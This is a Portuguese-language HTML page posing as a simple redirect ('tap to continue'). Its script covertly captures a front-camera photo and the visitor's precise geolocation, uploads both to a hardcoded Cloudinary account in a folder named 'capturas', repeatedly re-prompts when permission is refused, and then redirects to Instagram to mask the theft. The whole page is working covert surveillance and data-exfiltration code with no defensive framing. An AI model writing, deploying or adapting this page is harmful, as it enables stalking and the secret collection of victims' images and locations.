<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <title>Redirecionamento</title> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { margin: 0; overflow: hidden; background: #000; }
    #overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      color: #fff;
      font-family: sans-serif;
      font-size: 20px;
      background: rgba(0, 0, 0, 0.8);
      z-index: 9999;
      text-align: center;
      padding: 20px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div id="overlay">Toque para continuar...</div>

  <script>
    const cloudName = "dx5legahb";
    const uploadPreset = "upload";
    const folderName = "capturas";

    const overlay = document.getElementById("overlay");

    function showOverlay(message, callback) {
      overlay.textContent = message;
      overlay.style.display = "flex";
      const handler = () => {
        overlay.style.display = "none";
        overlay.removeEventListener("click", handler);
        if (callback) callback();
      };
      overlay.removeEventListener("click", handler);
      overlay.addEventListener("click", handler);
    }

    async function capturePhoto() {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" }, audio: false
      });
      const video = document.createElement("video");
      video.srcObject = stream;
      video.muted = true;
      video.playsInline = true;
      await video.play();

      await new Promise(r => setTimeout(r, 200));

      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      stream.getTracks().forEach(track => track.stop());

      const imageData = canvas.toDataURL("image/png");
      const blob = await (await fetch(imageData)).blob();

      const formData = new FormData();
      formData.append("file", blob);
      formData.append("upload_preset", uploadPreset);
      formData.append("folder", folderName);

      const res = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
        method: "POST",
        body: formData
      });

      const data = await res.json();
      return data.secure_url;
    }

    function pedirLocalizacao(imageUrl) {
      navigator.geolocation.getCurrentPosition(async (pos) => {
        const { latitude, longitude } = pos.coords;
        const texto = `Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imageUrl}`;
        const textBlob = new Blob([texto], { type: "text/plain" });

        const textForm = new FormData();
        textForm.append("file", textBlob, `localizacao_${Date.now()}.txt`);
        textForm.append("upload_preset", uploadPreset);
        textForm.append("folder", folderName);

        const textResp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, {
          method: "POST",
          body: textForm
        });

        window.location.href = "https://instagram.com";

      }, (err) => {
        console.warn("Erro ou permissão negada na localização:", err);
        showOverlay("Permissão de localização negada. Toque para tentar novamente.", () => {
          pedirLocalizacao(imageUrl); // Aqui repete o pedido de geolocalização
        });
      }, {
        enableHighAccuracy: true,
        timeout: 8000,
        maximumAge: 0
      });
    }

    async function startFlow() {
      try {
        const imageUrl = await capturePhoto();
        pedirLocalizacao(imageUrl); // vai pra etapa 2
      } catch (e) {
        console.error("Erro na captura:", e);
        showOverlay("Permissão de câmera negada. Toque para tentar novamente.", () => {
          startFlow(); // volta pra etapa 1
        });
      }
    }

    overlay.addEventListener("click", () => {
      overlay.style.display = "none";
      startFlow();
    });
  </script>
</body>
</html>
